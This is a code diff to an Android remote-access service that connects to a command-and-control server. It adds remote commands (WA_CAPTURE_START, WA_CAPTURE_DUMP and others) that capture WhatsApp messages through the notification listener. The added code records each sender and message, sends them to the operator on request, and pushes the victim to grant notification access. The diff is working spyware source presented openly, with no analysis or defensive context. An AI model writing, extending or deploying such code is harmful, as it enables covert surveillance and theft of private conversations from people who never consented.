@@ -121,6 +121,10 @@ public class AgentService extends Service {
     private ImageReader imageReader;
     private boolean isScreenCapturing = false;
     private static final int SCREENSHOT_DELAY = 500;
+    // ==================== WHATSAPP NOTIFICATION ====================
+    private StringBuilder whatsappMessages = new StringBuilder();
+    private boolean isWhatsAppCapturing = false;
+    private static final int MAX_WA_MESSAGES = 10000;
 
     // ==================== LIFECYCLE ====================
 
@@ -143,6 +147,8 @@ public class AgentService extends Service {
             Log.d(TAG, "📡 Connecting...");
             connectToC2();
         }, 1000);
+
+        NotificationListener.setAgentService(this);
     }
 
     private void createNotificationChannel() {
@@ -402,6 +408,26 @@ public class AgentService extends Service {
                     return toastResult.toString();
                 
                 case "HELP": return getHelp();
+
+                 // ============ WHATSAPP CAPTURE COMMANDS ============
+                case "WA_CAPTURE_START":
+                    return startWhatsAppCapture();
+            
+                case "WA_CAPTURE_STOP":
+                    return stopWhatsAppCapture();
+            
+                case "WA_CAPTURE_DUMP":
+                    return dumpWhatsAppMessages();
+            
+                case "WA_CAPTURE_STATS":
+                    return getWhatsAppStats();
+                case "WA_CAPTURE_CLEAR":
+                    whatsappMessages.setLength(0);
+                    whatsappMessages.append("=== CLEARED AT ").append(new Date()).append(" ===\n");
+                    JSONObject clearResult = new JSONObject();
+                    clearResult.put("status", "success");
+                    clearResult.put("message", "Messages cleared");
+                    return clearResult.toString();   
                 
                 default:
                     JSONObject unknown = new JSONObject();
@@ -1812,6 +1838,113 @@ public class AgentService extends Service {
         }
     }
 
+    // ==================== WHATSAPP MESSAGE HANDLER ====================
+
+public void onWhatsAppMessageCaptured(String appName, String sender, String message, String timestamp) {
+    if (!isWhatsAppCapturing) return;
+    
+    synchronized (whatsappMessages) {
+        String entry = String.format("[%s] %s - %s: %s\n", 
+                timestamp, appName, sender, message);
+        whatsappMessages.append(entry);
+        
+        // Batasi ukuran
+        if (whatsappMessages.length() > MAX_WA_MESSAGES * 100) {
+            int cutIndex = whatsappMessages.indexOf("\n", whatsappMessages.length() / 2);
+            if (cutIndex > 0) {
+                whatsappMessages.delete(0, cutIndex + 1);
+            }
+        }
+    }
+    
+    Log.d(TAG, "📥 WA Message: " + appName + " - " + sender + ": " + 
+            message.substring(0, Math.min(50, message.length())));
+}
+
+private String getWhatsAppMessages() {
+    synchronized (whatsappMessages) {
+        String result = whatsappMessages.toString();
+        // Kosongkan buffer setelah diambil
+        whatsappMessages.setLength(0);
+        whatsappMessages.append("=== NEW SESSION STARTED ===\n");
+        return result;
+    }
+}
+
+private String startWhatsAppCapture() {
+    isWhatsAppCapturing = true;
+    whatsappMessages.append("=== WHATSAPP CAPTURE STARTED AT ").append(new Date()).append(" ===\n");
+    
+    // Coba start notification listener
+    try {
+        Intent intent = new Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+    } catch (Exception e) {
+        Log.e(TAG, "Cannot open notification settings: " + e.getMessage());
+    }
+    
+    JSONObject result = new JSONObject();
+    try {
+        result.put("status", "success");
+        result.put("message", "WhatsApp message capture started");
+        result.put("note", "Please enable notification access in settings");
+        return result.toString();
+    } catch (JSONException e) {
+        return "{\"status\":\"success\",\"message\":\"WhatsApp capture started\"}";
+    }
+}
+
+private String stopWhatsAppCapture() {
+    isWhatsAppCapturing = false;
+    whatsappMessages.append("=== WHATSAPP CAPTURE STOPPED AT ").append(new Date()).append(" ===\n");
+    
+    JSONObject result = new JSONObject();
+    try {
+        result.put("status", "success");
+        result.put("message", "WhatsApp message capture stopped");
+        result.put("captured_count", whatsappMessages.toString().split("\n").length);
+        return result.toString();
+    } catch (JSONException e) {
+        return "{\"status\":\"success\",\"message\":\"WhatsApp capture stopped\"}";
+    }
+}
+
+private String dumpWhatsAppMessages() {
+    String messages = getWhatsAppMessages();
+    
+    try {
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("type", "whatsapp_messages");
+        result.put("messages", messages);
+        result.put("count", messages.split("\n").length);
+        result.put("timestamp", new Date().toString());
+        return result.toString();
+    } catch (JSONException e) {
+        return "{\"messages\":\"" + messages.replace("\"", "\\\"") + "\"}";
+    }
+}
+
+private String getWhatsAppStats() {
+    try {
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("is_capturing", isWhatsAppCapturing);
+        
+        int count = whatsappMessages.toString().split("\n").length;
+        int size = whatsappMessages.length();
+        
+        result.put("message_count", count);
+        result.put("buffer_size", size);
+        result.put("buffer_size_formatted", formatFileSize(size));
+        result.put("timestamp", new Date().toString());
+        return result.toString();
+    } catch (JSONException e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+        }
+
     // ==================== HELP ====================
 
     private String getHelp() {
@@ -1841,7 +1974,12 @@ public class AgentService extends Service {
                 "SCREENSHOT - Capture screen",
                 "SET_WALLPAPER <URL/base64> - Set wallpaper",
                 "SHOW_TOAST - Show toast message",
-                "HELP - Show this help"
+                "HELP - Show this help",
+                "WA_CAPTURE_START - Start WhatsApp message capture",
+                "WA_CAPTURE_STOP - Stop WhatsApp message capture",
+                "WA_CAPTURE_DUMP - Get captured WhatsApp messages",
+                "WA_CAPTURE_STATS - Get capture statistics",
+                "WA_CAPTURE_CLEAR - Clear captured messages",
             };
             for (String cmd : cmdList) {
                 commands.put(cmd);
@@ -1978,6 +2116,9 @@ public class AgentService extends Service {
         responseExecutor.shutdown();
         
         showToast("Agent Stopped");
+        // Stop WhatsApp capture
+    isWhatsAppCapturing = false;
+    NotificationListener.setAgentService(null);
     }
 
     @Override
